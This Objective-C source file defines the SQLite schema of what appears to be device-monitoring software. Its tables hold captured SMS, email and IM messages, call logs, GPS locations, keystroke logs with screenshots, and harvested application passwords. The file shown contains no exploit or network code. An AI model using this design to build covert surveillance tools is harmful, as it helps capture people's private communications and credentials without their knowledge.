//
//  DatabaseSchema.m
//  FxSqLite
//
//  Created by Makara Khloth on 9/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DatabaseSchema.h"
#import "DatabaseManager.h"
#import "FxDbException.h"
#import "FxSqlString.h"

#import <sqlite3.h>

#pragma mark Sql to create tables

static const NSString* kCreateSystemTable		= @"CREATE TABLE system (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"log_type INTEGER NOT NULL,"
															"direction INTEGER NOT NULL,"
															"message TEXT NOT NULL);";

static const NSString* kCreatePanicTable		= @"CREATE TABLE panic (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"panic_status INTEGER NOT NULL);";

static const NSString* kCreateLocationTable		= @"CREATE TABLE location (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"longitude REAL,"
															"latitude REAL,"
															"altitude REAL,"
															"horizontal_acc REAL,"
															"vertical_acc REAL,"
															"speed REAL,"
															"heading REAL,"
															"datum_id INTEGER,"
															"network_id TEXT,"
															"network_name TEXT,"
															"cell_id INTEGER,"
															"cell_name TEXT,"
															"area_code TEXT,"
															"country_code TEXT,"
															"calling_module INTEGER,"
															"method INTEGER,"
															"provider INTEGER);";

static const NSString* kCreateCallLogTable		= @"CREATE TABLE call_log (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"duration INTEGER NOT NULL,"
															"number TEXT NOT NULL,"
															"contact_name TEXT);";

static const NSString* kCreateSMSTable			= @"CREATE TABLE sms (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_number TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"conversation_id TEXT);";

static const NSString* kCreateMMSTable			= @"CREATE TABLE mms (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_number TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"conversation_id TEXT);";

static const NSString* kCreateEmailTable		= @"CREATE TABLE email (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_email TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"html_text TEXT);";

static const NSString* kCreateMediaTable		= @"CREATE TABLE media (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"full_path TEXT NOT NULL,"
															"media_event_type INTEGER NOT NULL,"
															"thumbnail_delivered INTEGER NOT NULL,"
															"has_thumbnail INTEGER NOT NULL,"
															"duration INTEGER);";

static const NSString* kCreateAttachmentTable	= @"CREATE TABLE attachment (id INTEGER PRIMARY KEY,"
															"full_path TEXT NOT NULL,"
															"mms_id INTEGER,"
															"email_id INTEGER,"
															"im_id INTEGER,"
															"FOREIGN KEY(mms_id) REFERENCES mms(id),"
															"FOREIGN KEY(email_id) REFERENCES email(id),"
															"FOREIGN KEY(im_id) REFERENCES im(id));";

static const NSString* kCreateRecipientTable	= @"CREATE TABLE recipient (id INTEGER PRIMARY KEY,"
															"recipient_type INTEGER NOT NULL,"
															"recipient TEXT NOT NULL,"
															"contact_name TEXT,"
															"sms_id INTEGER,"
															"mms_id INTEGER,"
															"email_id INTEGER,"
															"im_id INTEGER,"
															"FOREIGN KEY(sms_id) REFERENCES sms(id),"
															"FOREIGN KEY(mms_id) REFERENCES mms(id),"
															"FOREIGN KEY(email_id) REFERENCES email(id),"
															"FOREIGN KEY(im_id) REFERENCES im(id));";

static const NSString* kCreateGPSTagTable		= @"CREATE TABLE gps_tag (id INTEGER PRIMARY KEY,"
															"longitude REAL,"
															"latitude REAL,"
															"altitude REAL,"
															"cell_id INTEGER,"
															"area_code TEXT,"
															"network_id TEXT,"
															"country_code TEXT,"
															"FOREIGN KEY(id) REFERENCES media(id));";

static const NSString* kCreateCallTagTable		= @"CREATE TABLE call_tag (id INTEGER PRIMARY KEY,"
															"direction INTEGER,"
															"duration INTEGER,"
															"number TEXT NOT NULL,"
															"contact_name TEXT,"
															"FOREIGN KEY(id) REFERENCES media(id));";

static const NSString* kCreateThumbnailTable	= @"CREATE TABLE thumbnail (id INTEGER PRIMARY KEY,"
															"full_path TEXT,"
															"actual_size INTEGER NOT NULL,"
															"actual_duration INTEGER,"
															"media_id INTEGER,"
															"FOREIGN KEY(media_id) REFERENCES media(id));";

static const NSString* kCreateEventBaseTable	= @"CREATE TABLE event_base (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"event_type INTEGER NOT NULL,"
															"event_id INTEGER NOT NULL,"
															"direction INTEGER);";

static const NSString* kCreateSettingsTable		= @"CREATE TABLE settings (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"settings_data BLOB NOT NULL);";

static const NSString* kCreateIMTable			= @"CREATE TABLE im (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"user_id TEXT,"
															"im_service_id TEXT,"
															"message TEXT,"
															"user_display_name TEXT);";

static const NSString *kCreateBrowserUrlTable	= @"CREATE TABLE browser_url (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"title TEXT,"
															"url TEXT NOT NULL,"
															"visit_time TEXT,"
															"block INTEGER,"
															"owning_app TEXT NOT NULL);";

static const NSString *kCreateBookmarksTable	= @"CREATE TABLE bookmarks (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL);";

static const NSString *kCreateBookmarkTable		= @"CREATE TABLE bookmark (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"title TEXT,"
															"url TEXT NOT NULL,"
															"bookmarks_id INTEGER,"
															"FOREIGN KEY(bookmarks_id) REFERENCES bookmarks(id));";

static NSString * const kCreateApplicationLifeCycleTable	= @"CREATE TABLE application_life_cycle (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"app_state INTEGER,"
																"app_type INTEGER,"
																"app_id TEXT,"
																"app_name TEXT,"
																"app_version TEXT,"
																"app_size INTEGER,"
																"app_icon_type INTEGER,"
																"app_icon_data BLOB);";

static NSString * const kCreateIMMessageTable				= @"CREATE TABLE im_message (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"direction INTEGER,"
																"service_id INTEGER,"
																"conversation_id TEXT,"
																"sender_id TEXT,"
																"sender_place_name TEXT,"
																"sender_place_longitude REAL,"
																"sender_place_latitude REAL,"
																"sender_place_altitude REAL,"
																"sender_place_hor_accuracy REAL,"
																"message_representation INTEGER,"
																"message TEXT,"
																"share_place_name TEXT,"
																"share_place_longitude REAL,"
																"share_place_latitude REAL,"
																"share_place_altitude REAL,"
																"share_place_hor_accuracy REAL);";

static NSString * const kCreateIMAccountTable				= @"CREATE TABLE im_account (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"display_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMContactTable				= @"CREATE TABLE im_contact (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"contact_id TEXT,"
																"display_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMConversationTable			= @"CREATE TABLE im_conversation (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"conversation_id TEXT,"
																"conversation_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMConversationContactTable	= @"CREATE TABLE im_conversation_contact (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"im_conversation_id INTEGER NOT NULL,"
																"im_conversation_contact_id TEXT NOT NULL,"
																"FOREIGN KEY(im_conversation_id) REFERENCES im_conversation(id));";

static NSString * const kCreateIMMessageAttachmentTable		= @"CREATE TABLE im_message_attachment (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"full_path TEXT,"
																"thumbnail BLOB,"
																"im_message_id INTEGER,"
																"FOREIGN KEY(im_message_id) REFERENCES im_message(id));";

static NSString * const kCreateVoIPTable					= @"CREATE TABLE IF NOT EXISTS voip (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"category INTEGER,"
																"direction INTEGER,"
																"duration INTEGER,"
																"user_id TEXT,"
																"contact_name TEXT,"
																"transfered_byte INTEGER,"
																"monitor INTEGER,"
																"frame_strip_id INTEGER);";

static NSString * const kCreateKeyLogTable					= @"CREATE TABLE IF NOT EXISTS key_log (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"user_name TEXT,"
																"application_id TEXT,"
                                                                "application_name TEXT,"
																"window_title TEXT,"
                                                                "url TEXT,"
																"actual_display_data TEXT,"
																"raw_data TEXT,"
                                                                "screen_shot_path TEXT);";

static NSString * const kCreatePageVisitedTable				= @"CREATE TABLE IF NOT EXISTS page_visited (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "window_title TEXT,"
                                                                "url TEXT,"
                                                                "actual_display_data TEXT,"
                                                                "raw_data TEXT,"
                                                                "screen_shot_path TEXT);";

static NSString * const kCreatePasswordTable                = @"CREATE TABLE IF NOT EXISTS password (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "application_type TEXT);";

static NSString * const kCreateAppPasswordTable             = @"CREATE TABLE IF NOT EXISTS app_password (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "account_name TEXT,"
                                                                "user_name TEXT,"
                                                                "password TEXT,"
                                                                "password_id INTEGER NOT NULL,"
                                                                "FOREIGN KEY(password_id) REFERENCES password(id));";

static NSString *const kCreateUsbConnectionTable            = @"CREATE TABLE IF NOT EXISTS usb_connection (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "action INTEGER NOT NULL,"
                                                                "usb_device_type INTEGER NOT NULL,"
                                                                "drive_name TEXT);";

static NSString *const kCreateFileTransferTable            = @"CREATE TABLE IF NOT EXISTS file_transfer (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "direction INTEGER NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "transfer_type INTEGER NOT NULL,"
                                                                "source_path TEXT,"
                                                                "destination_path TEXT,"
                                                                "file_name TEXT,"
                                                                "file_size INTEGER NOT NULL);";

static NSString *const kCreateLogonTable                = @"CREATE TABLE IF NOT EXISTS logon (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "action INTEGER NOT NULL);";

static NSString *const kCreateApplicationUsageTable     = @"CREATE TABLE IF NOT EXISTS application_usage (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "active_focus_time TEXT,"
                                                                "lost_focus_time TEXT,"
                                                                "duration INTEGER);";

static NSString *const kCreateIMMacOSTable              = @"CREATE TABLE IF NOT EXISTS im_mac_os (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "im_service_id INTEGER NOT NULL,"
                                                                "conversation_name TEXT,"
                                                                "key_data TEXT,"
                                                                "snapshot_file_path TEXT);";

static const NSString* kCreateEmailMacOSTable           = @"CREATE TABLE IF NOT EXISTS email_mac_os (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "direction INTEGER NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "service_type INTEGER,"
                                                                "sender_email TEXT,"
                                                                "sender_name TEXT,"
                                                                "subject TEXT,"
                                                                "body TEXT);";

static NSString *const kCreateScreenshotTable           = @"CREATE TABLE IF NOT EXISTS screenshot (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "calling_module INTEGER NOT NULL,"
                                                                "frame_id INTEGER NOT NULL,"
                                                                "screenshot_file_path TEXT);";

static NSString *const kCreateFileActivityTable         = @"CREATE TABLE IF NOT EXISTS file_activity (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "activity_type INTEGER,"
                                                                "activity_file_type INTEGER,"
                                                                "activity_owner TEXT,"
                                                                "creation_date TEXT,"
                                                                "modification_date TEXT,"
                                                                "access_date TEXT,"
                                                                "original_file_info_data BLOB,"
                                                                "updated_file_info_data BLOB);";

static NSString *const kCreateNetworkTrafficTable       = @"CREATE TABLE IF NOT EXISTS network_traffic (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "start_time TEXT,"
                                                                "end_time TEXT,"
                                                                "network_traffic_interface BLOB);";

static NSString *const kCreateNetworkConnectionMacOSTable   = @"CREATE TABLE IF NOT EXISTS network_connection_mac_os (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "adapter BLOB,"
                                                                "adapter_status BLOB);";

static NSString *const kCreatePrintJobTable                 = @"CREATE TABLE IF NOT EXISTS print_job (id INTEGER PRIMARY KEY AUTOINCREMENT,"
                                                                "time TEXT NOT NULL,"
                                                                "user_logon_name TEXT,"
                                                                "application_id TEXT,"
                                                                "application_name TEXT,"
                                                                "title TEXT,"
                                                                "job_id TEXT,"
                                                                "owner_user_name TEXT,"
                                                                "printer_name TEXT,"
                                                                "document_name TEXT,"
                                                                "submit_time TEXT,"
                                                                "total_pages INTEGER,"
                                                                "total_bytes INTEGER,"
                                                                "file_path TEXT);";

#pragma mark Sql to create indexes

static const NSString* kCreateSystemIndex		= @"CREATE INDEX system_index ON system (id);";
static const NSString* kCreatePanicIndex		= @"CREATE INDEX panic_index ON panic (id);";
static const NSString* kCreateLocationIndex		= @"CREATE INDEX location_index ON location (id);";
static const NSString* kCreateCallLogIndex		= @"CREATE INDEX call_log_index ON call_log (id);";
static const NSString* kCreateSMSIndex			= @"CREATE INDEX sms_index ON sms (id);";
static const NSString* kCreateMMSIndex			= @"CREATE INDEX mms_index ON mms (id);";
static const NSString* kCreateEmailIndex		= @"CREATE INDEX email_index ON email (id);";
static const NSString* kCreateMediaIndex		= @"CREATE INDEX media_index ON media (id);";
static const NSString* kCreateAttachmentIndex	= @"CREATE INDEX attachment_index ON attachment (id);";
static const NSString* kCreateRecipientIndex	= @"CREATE INDEX recipient_index ON recipient (id);";
static const NSString* kCreateGPSTagIndex		= @"CREATE INDEX gps_tag_index ON gps_tag (id);";
static const NSString* kCreateCallTagIndex		= @"CREATE INDEX call_tag_index ON call_tag (id);";
static const NSString* kCreateThumbnailIndex	= @"CREATE INDEX thumbnail_index ON thumbnail (id);";
static const NSString* kCreateEventBaseIndex	= @"CREATE INDEX event_base_index ON event_base (id);";
static const NSString* kCreateSettingsIndex		= @"CREATE INDEX settings_index ON settings (id);";
static const NSString* kCreateIMIndex			= @"CREATE INDEX im_index ON im (id);";
static const NSString *kCreateBrowserUrlIndex	= @"CREATE INDEX browser_url_index ON browser_url (id);";
static const NSString *kCreateBookmarksIndex	= @"CREATE INDEX bookmarks_index ON bookmarks (id);";
static const NSString *kCreateBookmarkIndex		= @"CREATE INDEX bookmark_index ON bookmark (id);";
static NSString * const kCreateApplicationLifeCycleIndex	= @"CREATE INDEX application_life_cycle_index ON application_life_cycle (id);";
static NSString * const kCreateIMMessageIndex	= @"CREATE INDEX im_message_index ON im_message (id);";
static NSString * const kCreateIMAccountIndex	= @"CREATE INDEX im_account_index ON im_account (id);";
static NSString * const kCreateIMContactIndex	= @"CREATE INDEX im_contact_index ON im_contact (id);";
static NSString * const kCreateIMConversationIndex			= @"CREATE INDEX im_conversation_index ON im_conversation (id);";
static NSString * const kCreateIMConversationContactIndex	= @"CREATE INDEX im_conversation_contact_index ON im_conversation_contact (id);";
static NSString * const kCreateIMMessageAttachmentIndex		= @"CREATE INDEX im_message_attachment_index ON im_message_attachment (id);";
static NSString * const kCreateVoIPIndex		= @"CREATE INDEX IF NOT EXISTS voip_index ON voip (id);";
static NSString * const kCreateKeyLogIndex		= @"CREATE INDEX IF NOT EXISTS key_log_index ON key_log (id);";
static NSString * const kCreatePageVisitedIndex	= @"CREATE INDEX IF NOT EXISTS page_visited_index ON page_visited (id);";
static NSString * const kCreatePasswordIndex    = @"CREATE INDEX IF NOT EXISTS password_index ON password (id);";
static NSString * const kCreateAppPasswordIndex = @"CREATE INDEX IF NOT EXISTS app_password_index ON app_password (id);";
static NSString * const kCreateUsbConnectionIndex           = @"CREATE INDEX IF NOT EXISTS usb_connection_index ON usb_connection (id);";
static NSString * const kCreateFileTransferIndex            = @"CREATE INDEX IF NOT EXISTS file_transfer_index ON file_transfer (id);";
static NSString * const kCreateLogonIndex       = @"CREATE INDEX IF NOT EXISTS logon_index ON logon (id);";
static NSString * const kCreateApplicationUsageIndex        = @"CREATE INDEX IF NOT EXISTS application_usage_index ON application_usage (id);";
static NSString * const kCreateIMMacOSIndex     = @"CREATE INDEX IF NOT EXISTS im_mac_os_index ON im_mac_os (id);";
static NSString * const kCreateEmailMacOSIndex  = @"CREATE INDEX IF NOT EXISTS email_mac_os_index ON email_mac_os (id);";
static NSString * const kCreateScreenshotIndex  = @"CREATE INDEX IF NOT EXISTS screenshot_index ON screenshot (id);";
static NSString * const kCreateFileActivityIndex= @"CREATE INDEX IF NOT EXISTS file_activity_index ON file_activity (id);";
static NSString * const kCreateNetworkTrafficIndex          = @"CREATE INDEX IF NOT EXISTS network_traffic_index ON network_traffic (id);";
static NSString * const kCreateNetworkConnectionMacIndex    = @"CREATE INDEX IF NOT EXISTS network_connection_mac_os_index ON network_connection_mac_os (id);";
static NSString * const kCreatePrintJobIndex    = @"CREATE INDEX IF NOT EXISTS print_job_index ON print_job (id);";

#pragma mark Sql drop tables

static NSString* const kDropSystemTable         = @"DROP TABLE system;";
static NSString* const kDropCallLogTable        = @"DROP TABLE call_log;";
static NSString* const kDropPanicTable          = @"DROP TABLE panic;";
static NSString* const kDropLocationTable       = @"DROP TABLE location;";
//static NSString* const kDropEventBaseTable      = @"DROP TABLE event_base;";
static NSString* const kDropSMSTable            = @"DROP TABLE sms;";
static NSString* const kDropMMSTable            = @"DROP TABLE mms;";
static NSString* const kDropEmailTable          = @"DROP TABLE email;";
//static NSString* const kDropAttachmentTable     = @"DROP TABLE attachment;";
//static NSString* const kDropRecipientTable      = @"DROP TABLE recipient;";
static NSString* const kDropMediaTable          = @"DROP TABLE media;";
static NSString* const kDropGPSTagTable         = @"DROP TABLE gps_tag;";
static NSString* const kDropCallTagTable        = @"DROP TABLE call_tag;";
static NSString* const kDropThumbnailTable      = @"DROP TABLE thumbnail;";
static NSString* const kDropSettingsTable		= @"DROP TABLE settings;";
static NSString* const kDropIMTable				= @"DROP TABLE im;";
static NSString *const kDropBrowserUrlTable		= @"DROP TABLE browser_url;";
static NSString *const kDropBookmarksTable		= @"DROP TABLE bookmarks;";
static NSString *const kDropBookmarkTable		= @"DROP TABLE bookmark;";
static NSString * const kDropApplicationLifeCycleTable = @"DROP TABLE application_life_cycle;";
static NSString * const kDropIMMessageTable		= @"DROP TABLE im_message;";
static NSString * const kDropIMAccountTable		= @"DROP TABLE im_account;";
static NSString * const kDropIMContactTable		= @"DROP TABLE im_contact;";
static NSString * const kDropIMConversationTable		= @"DROP TABLE im_conversation;";
static NSString * const kDropIMConversationContactTable	= @"DROP TABLE im_conversation_contact;";
static NSString * const kDropIMMessageAttachmentTable	= @"DROP TABLE im_message_attachment;";
static NSString * const kDropVoIPTable					= @"DROP TABLE voip;";
static NSString * const kDropKeyLogTable				= @"DROP TABLE key_log;";
static NSString * const kDropPageVisitedTable			= @"DROP TABLE page_visited;";
static NSString * const kDropPasswordTable              = @"DROP TABLE password;";
static NSString * const kDropAppPasswordTable           = @"DROP TABLE app_password";
static NSString * const kDropUsbConnectionTable         = @"DROP TABLE usb_connection";
static NSString * const kDropFileTransferTable          = @"DROP TABLE file_transfer";
static NSString * const kDropLogonTable                 = @"DROP TABLE logon";
static NSString * const kDropApplicationUsageTable      = @"DROP TABLE application_usage";
static NSString * const kDropIMMacOSTable               = @"DROP TABLE im_mac_os";
static NSString * const kDropEmailMacOSTable            = @"DROP TABLE email_mac_os";
static NSString * const kDropScreenshotTable            = @"DROP TABLE screenshot";
static NSString * const kDropFileActivityTable          = @"DROP TABLE file_activity";
static NSString * const kDropNetworkTrafficTable        = @"DROP TABLE network_traffic";
static NSString * const kDropNetworkConnectionMacOSTable= @"DROP TABLE network_connection_mac_os";
static NSString * const kDropPrintJobTable              = @"DROP TABLE print_job";

#pragma mark Sql delete on drop tables

// ********** Auto increment field start from 1 ***********
static NSString* const kDeleteRecipientOnDropSMSTable       = @"DELETE FROM recipient WHERE sms_id > 0;";
static NSString* const kDeleteRecipientOnDropMMSTable       = @"DELETE FROM recipient WHERE mms_id > 0;";
static NSString* const kDeleteAttachmentOnDropMMSTable      = @"DELETE FROM attachment WHERE mms_id > 0;";
static NSString* const kDeleteRecipientOnDropEmailTable     = @"DELETE FROM recipient WHERE email_id > 0;";
static NSString* const kDeleteAttachmentOnDropEmailTable    = @"DELETE FROM attachment WHERE email_id > 0;";
static NSString* const kDeleteRecipientOnDropIMTable		= @"DELETE FROM recipient WHERE im_id > 0;";
static NSString* const kDeleteAttachmentOnDropIMTable		= @"DELETE FROM attachment WHERE im_id > 0;";
static NSString* const kDeleteRowOnDropAnyTable             = @"DELETE FROM event_base WHERE event_type = ?;";
// bookmarks and bookmark table is deleted all a long together
static NSString* const kDeleteRecipientOnDropEmailMacOSTable    = @"DELETE FROM recipient WHERE email_id > 0;";     // Same as email table
static NSString* const kDeleteAttachmentOnDropEmailMacOSTable   = @"DELETE FROM attachment WHERE email_id > 0;";    // Same as email table

#pragma mark Sql to create triggers

static const NSString* kCreateDeleteMMSAttachmentTrigger	= @"CREATE TRIGGER delete_mms_attachment AFTER DELETE ON mms "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.mms_id;"
																	"END;";

static const NSString* kCreateDeleteEmailAttachmentTrigger	= @"CREATE TRIGGER delete_email_attachment AFTER DELETE ON email "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.email_id;"
																	"END;";

static const NSString* kCreateDeleteSMSRecipientTrigger		= @"CREATE TRIGGER delete_sms_recipient AFTER DELETE ON sms "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.sms_id;"
																	"END;";

static const NSString* kCreateDeleteMMSRecipientTrigger		= @"CREATE TRIGGER delete_mms_recipient AFTER DELETE ON mms "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.mms_id;"
																	"END;";

static const NSString* kCreateDeleteEmailRecipientTrigger	= @"CREATE TRIGGER delete_email_recipient AFTER DELETE ON email "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.email_id;"
																	"END;";

static const NSString* kCreateDeleteGPSTagTrigger			= @"CREATE TRIGGER delete_gps_tag AFTER DELETE ON media "
																	"BEGIN "
																	"DELETE FROM gps_tag WHERE old.id = gps_tag.id;"
																	"END;";

static const NSString* kCreateDeleteCallTagTrigger			= @"CREATE TRIGGER delete_call_tag AFTER DELETE ON media "
																	"BEGIN "
																	"DELETE FROM call_tag WHERE old.id = call_tag.id;"
																	"END;";

static const NSString* kCreateDeleteThumbnailTrigger		= @"CREATE TRIGGER delete_thumbnail AFTER UPDATE OF thumbnail_delivered ON media "
																	"BEGIN "
																	"DELETE FROM thumbnail WHERE new.id = thumbnail.media_id AND new.thumbnail_delivered = 1;"
																	"END;";

static const NSString* kCreateDeleteIMAttachmentTrigger		= @"CREATE TRIGGER delete_im_attachment AFTER DELETE ON im "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.im_id;"
																	"END;";

static const NSString* kCreateDeleteIMRecipientTrigger		= @"CREATE TRIGGER delete_im_recipient AFTER DELETE ON im "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.im_id;"
																	"END;";

static const NSString *kCreateDeleteBookmarksBookmarkTrigger		= @"CREATE TRIGGER delete_bookmarks_bookmark AFTER DELETE ON bookmarks "
																		"BEGIN "
																		"DELETE FROM bookmark WHERE old.id = bookmark.bookmarks_id;"
																		"END;";

static NSString * const kCreateDeleteIMMessageAttachmentTrigger		= @"CREATE TRIGGER delete_im_message_attachment AFTER DELETE ON im_message "
																		"BEGIN "
																		"DELETE FROM im_message_attachment WHERE old.id = im_message_attachment.im_message_id;"
																		"END;";

static NSString * const kCreateDeleteIMConversationContactTrigger	= @"CREATE TRIGGER delete_im_conversation_contact AFTER DELETE ON im_conversation "
																		"BEGIN "
																		"DELETE FROM im_conversation_contact WHERE old.id = im_conversation_contact.im_conversation_id;"
																		"END;";

static NSString * const kCreateDeleteAppPasswordTrigger             = @"CREATE TRIGGER IF NOT EXISTS delete_app_password AFTER DELETE ON password "
                                                                        "BEGIN "
                                                                        "DELETE FROM app_password WHERE old.id = app_password.password_id;"
                                                                        "END;";

static const NSString* kCreateDeleteEmailMacOSAttachmentTrigger     = @"CREATE TRIGGER IF NOT EXISTS delete_email_mac_os_attachment AFTER DELETE ON email_mac_os "
                                                                        "BEGIN "
                                                                        "DELETE FROM attachment WHERE old.id = attachment.email_id;"
                                                                        "END;";

static const NSString* kCreateDeleteEmailMacOSRecipientTrigger      = @"CREATE TRIGGER IF NOT EXISTS delete_email_mac_os_recipient AFTER DELETE ON email_mac_os "
                                                                        "BEGIN "
                                                                        "DELETE FROM recipient WHERE old.id = recipient.email_id;"
                                                                        "END;";

@interface DatabaseSchema (private)

- (void) createTables: (const NSString*) sqlString;
- (void) createIndexes: (const NSString*) sqlString;
- (void) createTriggers: (const NSString*) sqlString;
- (void) executeSql: (const NSString*) sqlString;

@end

@implementation DatabaseSchema (private)

- (void) createTables: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) createIndexes: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) createTriggers: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) executeSql: (const NSString*) sqlString
{
	char* errorMessage = NULL;
	NSInteger sqliteError = sqlite3_exec([databaseManager sqlite3db], [sqlString cStringUsingEncoding:NSASCIIStringEncoding], NULL, NULL, &errorMessage);
	
	if (errorMessage)
	{
		sqlite3_free(errorMessage);
	}
	
	if (sqliteError != SQLITE_OK)
	{
		FxDbException* dbException = [FxDbException exceptionWithName:@"Execute sql to create table or index or trigger" andReason:@"Sqlite3 sql error"];
		dbException.errorCode = sqliteError;
		@throw dbException;
	}
}

@end

@implementation DatabaseSchema

- (id) initWithDatabaseManager: (DatabaseManager*) dbManager
{
	if ((self = [super init]))
	{
		databaseManager = dbManager;
	}
	return (self);
}

- (void) dealloc
{
	[super dealloc];
}

- (void) createDatabaseSchema
{
	// Create tables =========================================================
	// System
	[self createTables:kCreateSystemTable];
	// Panic
	[self createTables:kCreatePanicTable];
	// Location
	[self createTables:kCreateLocationTable];
	// Call log
	[self createTables:kCreateCallLogTable];
	// SMS
	[self createTables:kCreateSMSTable];
	// MMS
	[self createTables:kCreateMMSTable];
	// Email
	[self createTables:kCreateEmailTable];
	// Media
	[self createTables:kCreateMediaTable];
	// Attachment
	[self createTables:kCreateAttachmentTable];
	// Recipient
	[self createTables:kCreateRecipientTable];
	// GPS tag
	[self createTables:kCreateGPSTagTable];
	// Call tag
	[self createTables:kCreateCallTagTable];
	// Thumbnail
	[self createTables:kCreateThumbnailTable];
	// Event base
	[self createTables:kCreateEventBaseTable];
	// Settings
	[self createTables:kCreateSettingsTable];
	// IM
	[self createTables:kCreateIMTable];
	// Browser url
	[self createTables:kCreateBrowserUrlTable];
	// Bookmarks
	[self createTables:kCreateBookmarksTable];
	// Bookmark
	[self createTables:kCreateBookmarkTable];
	// Application life cycle
	[self createTables:kCreateApplicationLifeCycleTable];
	// IM message
	[self createTables:kCreateIMMessageTable];
	// IM account
	[self createTables:kCreateIMAccountTable];
